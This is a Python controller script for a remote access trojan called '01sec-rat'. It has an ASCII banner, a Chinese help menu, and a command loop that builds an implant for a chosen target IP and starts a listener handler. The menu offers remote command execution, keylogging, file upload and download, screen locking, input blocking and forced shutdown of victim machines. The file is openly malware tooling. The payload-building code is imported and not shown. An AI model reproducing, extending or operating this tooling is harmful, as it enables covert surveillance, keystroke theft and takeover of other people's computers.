import os
from createreplay import create, repair


__banner__ = '''
     .d8888b.   d888   .d8888b.  8888888888 .d8888b.  
    d88P  Y88b d8888  d88P  Y88b 888       d88P  Y88b 
    888    888   888  Y88b.      888       888    888 
    888    888   888   "Y888b.   8888888   888        
    888    888   888      "Y88b. 888       888        
    888    888   888        "888 888       888    888 
    Y88b  d88P   888  Y88b  d88P 888       Y88b  d88P 
     "Y8888P"  8888888 "Y8888P"  8888888888 "Y8888P"  
            ..=[        01sec-rat       ]=..             
            ..=[          v1.0.2        ]=..                            
'''


__help__ = '''
    sid>>shutdown      - 20秒关闭远程计算机
    sid>>reboot        - 20秒重启远程计算机
    sid>>cancel        - 取消关闭远程计算机
    sid>>shell         - 执行命令            [示例: sid>>shell 01Sec->sid->shell->whoami]
    sid>>keylogger     - 记录远程键盘输入并保存在log文件
    sid>>upload        - 上传到远程磁盘       [交互式操作]
    sid>>download      - 下载远程资源         
    sid>>lock          - 锁定远程计算机
    sid>>blockinput    - 禁止远程键盘输入
    sid>>input         - 允许远程键盘输入
    sid>>close         - 关闭远程客户端
'''


if __name__ == '__main__':
    print(__banner__)
    print(__help__)
    while True:
        cmd = input("01sec~")
        if "build" in cmd:
            targetip = input("[+] 请设置目标ip地址：")
            savefile = input("[+] 保存到：")
            create(targetip=targetip, savefile=savefile)
        if "repair" in cmd:
            repair()
        if cmd == "start":
            os.system("python ./core/handler.py")
        if cmd == "":
            pass
        if cmd == "exit":
            exit()
